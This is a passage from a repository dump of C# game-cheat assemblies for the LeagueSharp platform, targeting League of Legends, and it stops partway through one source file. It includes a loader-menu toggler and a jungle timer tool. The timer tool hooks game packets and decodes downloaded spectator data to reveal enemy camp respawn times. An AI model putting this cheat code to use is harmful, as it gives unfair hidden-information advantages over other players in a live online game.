Project Path: arc_gmh5225_LeagueSharp_lzkfpg4d

Source Tree:

```txt
arc_gmh5225_LeagueSharp_lzkfpg4d
├── AssemblySelector
│   ├── App.config
│   ├── AssemblySelector.csproj
│   ├── Program.cs
│   └── Properties
│       └── AssemblyInfo.cs
├── JungleTimerHax
│   ├── App.config
│   ├── JungleTimerHax.csproj
│   ├── Packets
│   │   ├── ExperienceGain.cs
│   │   ├── JungleSpawn.cs
│   │   └── Packet.cs
│   ├── Program.cs
│   ├── Properties
│   │   ├── AssemblyInfo.cs
│   │   ├── Resources.Designer.cs
│   │   └── Resources.resx
│   └── SpectatorService
│       ├── Blowfish.cs
│       ├── SpectatorDecoder.cs
│       └── SpectatorDownloader.cs
├── LeakBetaCoreDll
│   ├── App.config
│   ├── LeakBetaCoreDll.csproj
│   ├── Program.cs
│   └── Properties
│       └── AssemblyInfo.cs
├── MakeMyMonsterGrow
│   ├── App.config
│   ├── MakeMyMonsterGrow.csproj
│   ├── Program.cs
│   └── Properties
│       └── AssemblyInfo.cs
├── ProBuilds
│   ├── App.config
│   ├── DataDragon.cs
│   ├── ProBuilds.cs
│   ├── ProBuilds.csproj
│   ├── Program.cs
│   └── Properties
│       ├── AssemblyInfo.cs
│       ├── Resources.Designer.cs
│       └── Resources.resx
├── README.md
├── Shoutbox
│   ├── App.config
│   ├── Program.cs
│   ├── Properties
│   │   └── AssemblyInfo.cs
│   ├── Shoutbox.cs
│   └── Shoutbox.csproj
└── SkinHax
    ├── App.config
    ├── Program.cs
    ├── Properties
    │   └── AssemblyInfo.cs
    └── SkinHax.csproj

```

`AssemblySelector/App.config`:

```config
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5"/>
    </startup>
</configuration>

```

`AssemblySelector/AssemblySelector.csproj`:

```csproj
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="12.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Release</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProjectGuid>{4A9F7272-33F7-465C-8BD9-87E801222C2E}</ProjectGuid>
    <OutputType>Exe</OutputType>
    <AppDesignerFolder>Properties</AppDesignerFolder>
    <RootNamespace>AssemblySelector</RootNamespace>
    <AssemblyName>AssemblySelector</AssemblyName>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
    <IsWebBootstrapper>false</IsWebBootstrapper>
    <PublishUrl>publish\</PublishUrl>
    <Install>true</Install>
    <InstallFrom>Disk</InstallFrom>
    <UpdateEnabled>false</UpdateEnabled>
    <UpdateMode>Foreground</UpdateMode>
    <UpdateInterval>7</UpdateInterval>
    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
    <UpdatePeriodically>false</UpdatePeriodically>
    <UpdateRequired>false</UpdateRequired>
    <MapFileExtensions>true</MapFileExtensions>
    <ApplicationRevision>0</ApplicationRevision>
    <ApplicationVersion>1.1.0.%2a</ApplicationVersion>
    <UseApplicationTrust>false</UseApplicationTrust>
    <BootstrapperEnabled>true</BootstrapperEnabled>
    <TargetFrameworkProfile />
    <PreBuildEvent />
    <OutputPath>bin\Release</OutputPath>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    <PlatformTarget>x86</PlatformTarget>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>bin\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <PlatformTarget>x86</PlatformTarget>
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup>
    <ApplicationIcon>
    </ApplicationIcon>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="LeagueSharp, Version=1.0.0.25, Culture=neutral, processorArchitecture=x86">
      <SpecificVersion>False</SpecificVersion>
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\LeagueSharp.dll</HintPath>
    </Reference>
    <Reference Include="LeagueSharp.Common">
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\LeagueSharp.Common.dll</HintPath>
    </Reference>
    <Reference Include="SharpDX, Version=2.5.0.0, Culture=neutral, processorArchitecture=MSIL">
      <SpecificVersion>False</SpecificVersion>
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\SharpDX.dll</HintPath>
    </Reference>
    <Reference Include="SharpDX.Direct3D9, Version=2.5.0.0, Culture=neutral, processorArchitecture=MSIL">
      <SpecificVersion>False</SpecificVersion>
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\SharpDX.Direct3D9.dll</HintPath>
    </Reference>
    <Reference Include="System" />
    <Reference Include="System.Core" />
    <Reference Include="System.Drawing" />
    <Reference Include="System.Xml.Linq" />
    <Reference Include="System.Data.DataSetExtensions" />
    <Reference Include="Microsoft.CSharp" />
    <Reference Include="System.Data" />
    <Reference Include="System.Xml" />
    <Reference Include="UIAutomationClient" />
    <Reference Include="UIAutomationClientsideProviders" />
    <Reference Include="UIAutomationProvider" />
    <Reference Include="UIAutomationTypes" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="Program.cs" />
    <Compile Include="Properties\AssemblyInfo.cs" />
  </ItemGroup>
  <ItemGroup>
    <None Include="App.config">
      <SubType>Designer</SubType>
    </None>
  </ItemGroup>
  <ItemGroup>
    <BootstrapperPackage Include=".NETFramework,Version=v4.5.1">
      <Visible>False</Visible>
      <ProductName>Microsoft .NET Framework 4.5.1 %28x86 and x64%29</ProductName>
      <Install>true</Install>
    </BootstrapperPackage>
    <BootstrapperPackage Include="Microsoft.Net.Client.3.5">
      <Visible>False</Visible>
      <ProductName>.NET Framework 3.5 SP1 Client Profile</ProductName>
      <Install>false</Install>
    </BootstrapperPackage>
    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
      <Visible>False</Visible>
      <ProductName>.NET Framework 3.5 SP1</ProductName>
      <Install>false</Install>
    </BootstrapperPackage>
  </ItemGroup>
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
  <PropertyGroup>
    <PostBuildEvent>
    </PostBuildEvent>
  </PropertyGroup>
  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
       Other similar extension points exist, see Microsoft.Common.targets.
  <Target Name="BeforeBuild">
  </Target>
  <Target Name="AfterBuild">
  </Target>
  -->
</Project>
```

`AssemblySelector/Program.cs`:

```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Automation;
using LeagueSharp;
using LeagueSharp.Common;

namespace AssemblySelector
{
    internal class Program
    {
        public static Menu Config;
        public static Dictionary<String, TogglePattern> assemblyList = new Dictionary<String, TogglePattern>();
        static void Main(String[] args)
        {
            CustomEvents.Game.OnGameLoad += Game_OnGameLoad;
        }

        static void Game_OnGameLoad(EventArgs args)
        {
            Game.PrintChat("AssemblySelector loaded!");
            Config = new Menu("ExeSelect", "AssemblySelector", true);
            Config.AddToMainMenu();
            new Thread(() =>
            {
                AutomationElement desktop = AutomationElement.RootElement;
                AutomationElement leaguesharp = desktop.FindFirst(TreeScope.Children, new PropertyCondition(AutomationElement.NameProperty, "LeagueSharp"));
                AutomationElement assemblyTab = leaguesharp.FindFirst(TreeScope.Children, new PropertyCondition(AutomationElement.ClassNameProperty, "TabControl"));
                AutomationElement assemblyTabItem = assemblyTab.FindFirst(TreeScope.Children, new PropertyCondition(AutomationElement.NameProperty, "Assemblies"));
                AutomationElement assemblyGrid = assemblyTabItem.FindFirst(TreeScope.Children, new PropertyCondition(AutomationElement.ClassNameProperty, "DataGrid"));
                Boolean allAssemblies = false;
                int i = 0;
                Game.PrintChat(leaguesharp.Current.Name);
                while (!allAssemblies)
                {
                    AutomationElement assemblyName = ((GridPattern)assemblyGrid.GetCurrentPattern(GridPattern.Pattern)).GetItem(i, 1);
                    if (assemblyName == null)
                        break;
                    AutomationElement assemblyType = ((GridPattern)assemblyGrid.GetCurrentPattern(GridPattern.Pattern)).GetItem(i, 2);
                    if (assemblyType.Current.Name.Contains("Executable")){
                        AutomationElement checkBoxElement = ((GridPattern)assemblyGrid.GetCurrentPattern(GridPattern.Pattern)).GetItem(i, 0).FindFirst(TreeScope.Children, Condition.TrueCondition);
                        TogglePattern checkBox = (TogglePattern)checkBoxElement.GetCurrentPattern(TogglePattern.Pattern);
                        Boolean init = false;
                        if (checkBox.Current.ToggleState == ToggleState.On)
                            init = true;
                        MenuItem assemblyItem = Config.AddItem(new MenuItem(assemblyName.Current.Name, assemblyName.Current.Name).SetValue<bool>(init));
                        assemblyList.Add(assemblyName.Current.Name, checkBox);
                        assemblyItem.ValueChanged += (s, e) =>
                        {
                            try
                            {
                                Console.WriteLine(((MenuItem)s).Name);
                                new Thread(() =>
                                {
                                    Thread.Sleep(500);
                                    if (assemblyList[((MenuItem)s).Name].Current.ToggleState == ToggleState.Off && e.GetNewValue<Boolean>() ||
                                        assemblyList[((MenuItem)s).Name].Current.ToggleState == ToggleState.On && !e.GetNewValue<Boolean>())
                                        assemblyList[((MenuItem)s).Name].Toggle();
                                }).Start();
                            }
                            catch
                            {

                            }
                        };
                    }
                    i++;
                }
            }).Start();
        }
    }
}

```

`AssemblySelector/Properties/AssemblyInfo.cs`:

```cs
using System.Reflection;
using System.Runtime.InteropServices;

[assembly: AssemblyTitle("AssemblySelector")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("AssemblySelector")]
[assembly: AssemblyProduct("Shoutbox")]
[assembly: AssemblyCopyright("Copyright © 2014")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

[assembly: ComVisible(false)]

[assembly: Guid("e6cab8a6-530c-49f3-88e6-f1f6339678d7")]

[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

```

`JungleTimerHax/App.config`:

```config
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5"/>
    </startup>
</configuration>

```

`JungleTimerHax/JungleTimerHax.csproj`:

```csproj
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="12.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Release</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProjectGuid>{4A9F7272-33F7-465C-8BD9-87F801222C9E}</ProjectGuid>
    <OutputType>Exe</OutputType>
    <AppDesignerFolder>Properties</AppDesignerFolder>
    <RootNamespace>JungleTimerHax</RootNamespace>
    <AssemblyName>JungleTimerHax</AssemblyName>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
    <IsWebBootstrapper>false</IsWebBootstrapper>
    <PublishUrl>publish\</PublishUrl>
    <Install>true</Install>
    <InstallFrom>Disk</InstallFrom>
    <UpdateEnabled>false</UpdateEnabled>
    <UpdateMode>Foreground</UpdateMode>
    <UpdateInterval>7</UpdateInterval>
    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
    <UpdatePeriodically>false</UpdatePeriodically>
    <UpdateRequired>false</UpdateRequired>
    <MapFileExtensions>true</MapFileExtensions>
    <ApplicationRevision>0</ApplicationRevision>
    <ApplicationVersion>1.1.0.%2a</ApplicationVersion>
    <UseApplicationTrust>false</UseApplicationTrust>
    <BootstrapperEnabled>true</BootstrapperEnabled>
    <TargetFrameworkProfile />
    <PreBuildEvent />
    <OutputPath>bin\Release</OutputPath>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    <PlatformTarget>x86</PlatformTarget>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>bin\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <PlatformTarget>x86</PlatformTarget>
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup>
    <ApplicationIcon>
    </ApplicationIcon>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="LeagueSharp">
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\LeagueSharp.dll</HintPath>
    </Reference>
    <Reference Include="LeagueSharp.Common">
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\LeagueSharp.Common.dll</HintPath>
    </Reference>
    <Reference Include="SharpDX, Version=2.5.0.0, Culture=neutral, processorArchitecture=MSIL">
      <SpecificVersion>False</SpecificVersion>
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\SharpDX.dll</HintPath>
    </Reference>
    <Reference Include="System" />
    <Reference Include="System.Core" />
    <Reference Include="System.Drawing" />
    <Reference Include="System.Web.Extensions" />
    <Reference Include="System.Xml.Linq" />
    <Reference Include="System.Data.DataSetExtensions" />
    <Reference Include="Microsoft.CSharp" />
    <Reference Include="System.Data" />
    <Reference Include="System.Xml" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="Packets\ExperienceGain.cs" />
    <Compile Include="Packets\JungleSpawn.cs" />
    <Compile Include="Packets\Packet.cs" />
    <Compile Include="Program.cs" />
    <Compile Include="Properties\AssemblyInfo.cs" />
    <Compile Include="Properties\Resources.Designer.cs">
      <AutoGen>True</AutoGen>
      <DesignTime>True</DesignTime>
      <DependentUpon>Resources.resx</DependentUpon>
    </Compile>
    <Compile Include="SpectatorService\Blowfish.cs" />
    <Compile Include="SpectatorService\SpectatorDecoder.cs" />
    <Compile Include="SpectatorService\SpectatorDownloader.cs" />
  </ItemGroup>
  <ItemGroup>
    <None Include="App.config">
      <SubType>Designer</SubType>
    </None>
  </ItemGroup>
  <ItemGroup>
    <BootstrapperPackage Include=".NETFramework,Version=v4.5.1">
      <Visible>False</Visible>
      <ProductName>Microsoft .NET Framework 4.5.1 %28x86 and x64%29</ProductName>
      <Install>true</Install>
    </BootstrapperPackage>
    <BootstrapperPackage Include="Microsoft.Net.Client.3.5">
      <Visible>False</Visible>
      <ProductName>.NET Framework 3.5 SP1 Client Profile</ProductName>
      <Install>false</Install>
    </BootstrapperPackage>
    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
      <Visible>False</Visible>
      <ProductName>.NET Framework 3.5 SP1</ProductName>
      <Install>false</Install>
    </BootstrapperPackage>
  </ItemGroup>
  <ItemGroup>
    <EmbeddedResource Include="Properties\Resources.resx">
      <Generator>ResXFileCodeGenerator</Generator>
      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
      <SubType>Designer</SubType>
    </EmbeddedResource>
  </ItemGroup>
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
  <PropertyGroup>
    <PostBuildEvent>
    </PostBuildEvent>
  </PropertyGroup>
  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
       Other similar extension points exist, see Microsoft.Common.targets.
  <Target Name="BeforeBuild">
  </Target>
  <Target Name="AfterBuild">
  </Target>
  -->
</Project>
```

`JungleTimerHax/Packets/ExperienceGain.cs`:

```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace JungleTimerHax.Packets
{
    class ExperienceGain : Packet
    {
        public UInt32 RecvNetId { get { return BitConverter.ToUInt32(content, 0); } }
        public UInt32 GivingNetId { get { return BitConverter.ToUInt32(content, 4); } }
        public Single Amount { get { return BitConverter.ToSingle(content, 8); } }
        public ExperienceGain(Packet p)
            : base(p.param, p.header, p.time, p.content)
        {
        }
    }
}

```

`JungleTimerHax/Packets/JungleSpawn.cs`:

```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace JungleTimerHax.Packets
{
    class JungleSpawn : Packet
    {
        public UInt32 netId { get { return BitConverter.ToUInt32(content, 0); } }
        public Single x { get { return BitConverter.ToSingle(content, 5); } }
        public Single z { get { return BitConverter.ToSingle(content, 9); } }
        public Single y { get { return BitConverter.ToSingle(content, 13); } }
        public Single campX { get { return BitConverter.ToSingle(content, 17); } }
        public Single campY { get { return BitConverter.ToSingle(content, 21); } }
        public Single campZ { get { return BitConverter.ToSingle(content, 25); } }
        public Single campRoundX { get { return BitConverter.ToSingle(content, 29); } }
        public Single campRoundY { get { return BitConverter.ToSingle(content, 33); } }
        public Single campRoundZ { get { return BitConverter.ToSingle(content, 37); } }
        public Byte campId { get { return content[40]; } }
        public String creepName { get { return Encoding.UTF8.GetString(content, 41, content.ToList().IndexOf(0, 41) - 41); } }
        public JungleSpawn(Packet p)
            : base(p.param, p.header, p.time, p.content)
        {
        }
    }
}

```

`JungleTimerHax/Packets/Packet.cs`:

```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace JungleTimerHax.Packets
{
    public enum HeaderList
    {
        KeyCheck = 0x00,
        MinionSpawn = 0x03,
        SellItem = 0x0B,
        EndSpawn = 0x11,
        AbilityLevel = 0x15,
        CreateEffect = 0x17,
        AutoAttack = 0x1A,
        ExperienceGain = 0x22,
        FogUpdate = 0x23,
        PlayAnimation = 0x29,
        PlayerInfo = 0x2A,
        SpawnProjectile = 0x3B,
        SwapItems = 0x3E,
        LevelUp = 0x3F,
        AttentionPing = 0x40,
        Emotion = 0x42,
        PlayerStats = 0x46,
        HeroSpawn = 0x4C,
        Announce = 0x4D, //not called
        SynchVersion = 0x54,
        DestroyProjectile = 0x5A,
        StartGame = 0x5C,
        DeathTimer = 0x5E,
        Waypoints = 0x61,
        StartSpawn = 0x62,
        JungleSpawn = 0x63,
        ChampionNames_Damage = 0x65,
        CharacterNames_Unk66 = 0x66,
        LoadScreen = 0x67,
        Chat = 0x68,
        SetTarget = 0x6A,
        BuyItem = 0x6F,
        ZyraPassive = 0x86,
        SpawnParticle = 0x87,
        GameId = 0x92,
        PingLoad = 0x95,
        KhazixEvo = 0x96,
        ZedShadow = 0x97,
        TurretSpawn = 0x9D,
        DeathRecap = 0xA3,
        SetHealth = 0xAE,
        SpellCast = 0xB5,
        UnitSpawn = 0xBA,
        GameTimer = 0xC0,
        GameTimerUpdate = 0xC1,
        CharStats = 0xC4,
        LevelPropSpawn = 0xD0,
        Teleport = 0xD8,
        Gold = 0xE4,
        JungleCampSpawn = 0xE9,
        ChangeTarget_InventoryUpdate = 0xFE,

        Unk85 = 0x85, //param netid, byte flag; float 24.14; float -1, 10, 90, 120, etc.
        Unk7f = 0x7F, //unit16 num,, net id...??
        Unkb7 = 0xB7,
        Unke0 = 0xE0,
        Unke1 = 0xE1,
        UnkC2 = 0xC2,
        Unk1c = 0x1c, // 06-01-00-00-16-44-00-00-00-00 + netid
        Unk76 = 0x76, // every ten seconds, ten packets, float float float, no net id
        Unk35 = 0x35,
        Unk51 = 0x51, //no content, param netid no player
        Unk50 = 0x50,// param netid, float float float, 0-1, abaaa3d or 0
        Unk6E = 0x6E, // attach child to parent? parent = param, child = byte0-3
        UnkFD = 0xFD, // next AA does something?
        Unk45 = 0x45, //announcer?
        Unk6B = 0x6B,
        Unk9F = 0x9F, //param player netid, byte 0127, byte 0-3, byte 0-1
        Unk7C = 0x7C,
        Unk7 = 0x7, //netid 0-4, only players
        Unk34 = 0x34, // param netid sometimes, then 5 bytes
        UnkB2 = 0xB2, //?? param netid, uint32 increasing 1++, uint16 flag, .2 or 0, zyra triggers the 0 on death, kha triggers 
        UnkE2 = 0xE2,
        Unk9E = 0x9E, //??, param new netid, byte03 netid, uint32 unk,uint32 unk,
        Unk38 = 0x38,
        Unk7B = 0x7B, //param netid, byte unk,  4byte hash, 0000
        Unk33 = 0x33, // only contains a netid,
        Unk32 = 0x32, //??, param netid, increasing most of the time 2 bytes
        Unk26 = 0x26, //param netid, always increasing, so maybe projectile netid?, byte 0 = num of netids in content, byte1-4 netid1, byte5-8 netid2
        UnkC3 = 0xC3, // jungle clear?
        Unk30 = 0x30, //not sure, plant/trap/movement?, netid @ 9, target? on param
        UnkC = 0xC,
        Unk44 = 0x44,
        Unk10 = 0x10, //netid, some random float? maybe zoom? time?
        Unk73 = 0x73, // param netid, float float float, might be recall
        Unk3F = 0x3F,
        Unk64 = 0x64,
        Unk18 = 0x18, //?? not much data, a byte and a float
        UnkB0 = 0xB0, //? spawn particle/effect?
        UnkCE = 0xCE,
        Unk1F = 0x1F, // param = netid, FF-FF or 2[ed]-2[ed]
        Unk21 = 0x21,
        Unk71 = 0x71,
        Unk1B = 0x1B, // ??, single float, 7 occurences in a game, 3 to 19
        UnkC8 = 0xC8, // 7 packets, maybe turret death?
        Unk2F = 0x2F, // 23 times, 3 floats, ~14k, ~14, even number 400 710 etc.
        UnkE3 = 0xE3, // net id at 10/12/20 minutes
        UnkA5 = 0xA5, // 2 packets, 7 bytes???
        Unk89 = 0x89, //unk param, 4 byte netid, 0000
        Unk2B = 0x2B, // only happened twice, F0-00
        UnkC9 = 0xC9, // surrender vote maybe?

    };
    public class Packet
    {
        public Boolean isPacketType = true;
        public UInt32 param;
        public Byte header;
        public Single time;
        public Byte[] content;
        public Packet(UInt32 param, Byte header, Single time, Byte[] content)
        {
            this.param = param;
            this.header = header;
            this.time = time;
            this.content = new Byte[content.Length];
            Array.Copy(content, this.content, content.Length);
        }
    }
}

```

`JungleTimerHax/Program.cs`:

```cs
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using LeagueSharp;
using LeagueSharp.Common;
using SharpDX;
using Color = System.Drawing.Color;

namespace JungleTimerHax
{
    internal class Program
    {
        public static Menu Config;
        public const String BaseUrl = "http://www.lolnexus.com/ajax/get-game-info/";
        public const String UrlPartial = ".json?name=";
        public const String SearchString = "lrf://spectator ";
        
        public static Dictionary<UInt32, Vector3> junglePos = new Dictionary<UInt32, Vector3>();
        public static Dictionary<UInt32, Single> jungleRespawns = new Dictionary<UInt32, Single>();
        public static String Key;
        public static String GameId;
        public static String PlatformId;
        public static String RegionTag;
        public static String SpecUrl;
        public static Single TimeOffset = 0;
        private static void Main(string[] args)
        {
            
            junglePos[0x1] = new Vector3(3632.7f, 7600.373f, 60.0f); jungleRespawns[0x1] = 115.0f;
            junglePos[0x2] = new Vector3(3373.678f, 6223.346f, 60.0f); jungleRespawns[0x2] = 125.0f;
            junglePos[0x3] = new Vector3(6300.05f, 5300.06f, 60.0f); jungleRespawns[0x3] = 125.0f;
            junglePos[0x4] = new Vector3(7455.615f, 3890.203f, 60.0f); jungleRespawns[0x4] = 115.0f;
            junglePos[0x5] = new Vector3(7916.842f, 2533.963f, 60.0f); jungleRespawns[0x5] = 125.0f;
            junglePos[0x6] = new Vector3(9459.52f, 4193.03f, 60.0f); jungleRespawns[0x6] = 150.0f;
            junglePos[0x7] = new Vector3(10386.61f, 6811.112f, 60.0f); jungleRespawns[0x7] = 115.0f;
            junglePos[0x8] = new Vector3(10651.52f, 8116.424f, 60.0f); jungleRespawns[0x8] = 125.0f;
            junglePos[0x9] = new Vector3(7580.368f, 9250.405f, 60.0f); jungleRespawns[0x9] = 125.0f;
            junglePos[0xA] = new Vector3(6504.241f, 10584.56f, 60.0f); jungleRespawns[0xA] = 115;
            junglePos[0xB] = new Vector3(5810.464f, 11925.47f, 60.0f); jungleRespawns[0xB] = 125.0f;
            junglePos[0xC] = new Vector3(4600.495f, 10250.46f, 60.0f); jungleRespawns[0xC] = 900.0f;
            junglePos[0xD] = new Vector3(1684.0f, 8207.0f, 60.0f); jungleRespawns[0xD] = 125.0f;
            junglePos[0xE] = new Vector3(12337.0f, 6263.0f, 60.0f); jungleRespawns[0xE] = 125.0f;
            CustomEvents.Game.OnGameLoad += Game_OnGameLoad;
        }

        static void Game_OnGameLoad(EventArgs args)
        {
            new System.Threading.Thread(() =>
            {
                GetRegionInfo();
                GetSpecInfo();
            }).Start();

            (Config = new Menu("JungleTimerHax", "JungleTimerHax", true)).AddToMainMenu();
            Config.AddItem(new MenuItem("TextColor", "Text Color").SetValue(new Circle(true, Color.FromArgb(255, 255, 255, 0))));
            Config.AddItem(new MenuItem("OutlineColor", "Outline Color").SetValue(new Circle(true, Color.FromArgb(255, 0, 0, 0))));

            Drawing.OnDraw += Drawing_OnDraw;
            Game.OnGameProcessPacket += Game_OnGameProcessPacket;
        }
        static void Game_OnGameProcessPacket(GamePacketEventArgs args)
        {
            if (args.PacketData[0] == 0xC1 || args.PacketData[0] == 0xC2)
            {
                TimeOffset = BitConverter.ToSingle(args.PacketData, 5) - Game.Time;
                new System.Threading.Thread(() =>
                {
                    GetTimers();
                }).Start();
            }
            else if (args.PacketData[0] == Packet.S2C.EmptyJungleCamp.Header)
            {
                Byte Camp = args.PacketData[9];
                TimeSpan time = TimeSpan.FromSeconds(jungleRespawns[Camp] - Game.Time - TimeOffset);
                if (time.TotalSeconds < 0)
                {
                    if (Camp == 0xC)
                        jungleRespawns[Camp] = Game.Time + TimeOffset + 420;
                    else if (Camp == 0x6)
                        jungleRespawns[Camp] = Game.Time + TimeOffset + 360;
                    else if (Camp == 0x1 || Camp == 0x4 || Camp == 0x7 || Camp == 0xA)
                        jungleRespawns[Camp] = Game.Time + TimeOffset + 300;
                    else
                        jungleRespawns[Camp] = Game.Time + TimeOffset + 50;
                }
            }
        }
        static void GetRegionInfo()
        {
            Process proc = Process.GetProcesses().First(p => p.ProcessName.Contains("League of Legends"));
            String propFile = Path.GetDirectoryName(Path.GetDirectoryName(Path.GetDirectoryName(Path.GetDirectoryName(Path.GetDirectoryName(Path.GetDirectoryName(proc.Modules[0].FileName))))));
            propFile += @"\projects\lol_air_client\releases\";
            DirectoryInfo di = new DirectoryInfo(propFile).GetDirectories().OrderByDescending(d => d.LastWriteTimeUtc).First();
            propFile = di.FullName + @"\deploy\lol.properties";
            propFile = File.ReadAllText(propFile);
            SpecUrl = new Regex("featuredGamesURL=(.+)featured").Match(propFile).Groups[1].Value;
            RegionTag = new Regex("regionTag=(.+)\r").Match(propFile).Groups[1].Value;
            SpectatorService.SpectatorDownloader.specHtml = SpecUrl;
        }
        static void GetSpecInfo()
        {
            String GameInfo = new WebClient().DownloadString(BaseUrl + RegionTag + UrlPartial + ObjectManager.Player.Name);
            GameInfo = GameInfo.Substring(GameInfo.IndexOf(SearchString) + SearchString.Length);
            GameInfo = GameInfo.Substring(GameInfo.IndexOf(" ") + 1);
            Key = GameInfo.Substring(0, GameInfo.IndexOf(" "));
            GameInfo = GameInfo.Substring(GameInfo.IndexOf(" ") + 1);
            GameId = GameInfo.Substring(0, GameInfo.IndexOf(" "));
            GameInfo = GameInfo.Substring(GameInfo.IndexOf(" ") + 1);
            PlatformId = GameInfo.Substring(0, GameInfo.IndexOf(" "));
        }
        static void GetTimers()
        {
            List<Packets.Packet> packets = new List<Packets.Packet>();
            List<Byte[]> fullGameBytes = SpectatorService.SpectatorDownloader.DownloadGameFiles(GameId, PlatformId, Key, "Chunk");
            foreach (Byte[] chunkBytes in fullGameBytes)
            {
                packets.AddRange(SpectatorService.SpectatorDecoder.DecodeBytes(chunkBytes));
            }
            foreach (Packets.Packet p in packets)
            {
                if (p.header == Packet.S2C.EmptyJungleCamp.Header && p.content[3] != 0)
                {
                    UInt32 camp = p.content[4];
                    if ((camp == 0x1 || camp == 0x4 || camp == 0x7 || camp == 0xA) &&
                        TimeSpan.FromSeconds(p.time + 300 - Game.Time - TimeOffset + 2).TotalSeconds > 0)
                        jungleRespawns[camp] = p.time + 300;
                    else if ((camp == 0x6) &&
                        TimeSpan.FromSeconds(p.time + 360 - Game.Time - TimeOffset + 2).TotalSeconds > 0)
                        jungleRespawns[camp] = p.time + 360;
                    else if ((camp == 0xC) &&
                        TimeSpan.FromSeconds(p.time + 420 - Game.Time - TimeOffset + 2).TotalSeconds > 0)
                        jungleRespawns[camp] = p.time + 420;
                }
            }
        }
        static void Drawing_OnDraw(EventArgs args)
        {
            foreach (KeyValuePair<UInt32, Single> creep in jungleRespawns)
            {
                Vector2 pos = Drawing.WorldToMinimap(junglePos[creep.Key]);
                TimeSpan time = TimeSpan.FromSeconds(creep.Value - Game.Time - TimeOffset + 2);
                if (time.TotalSeconds > 0)
                {
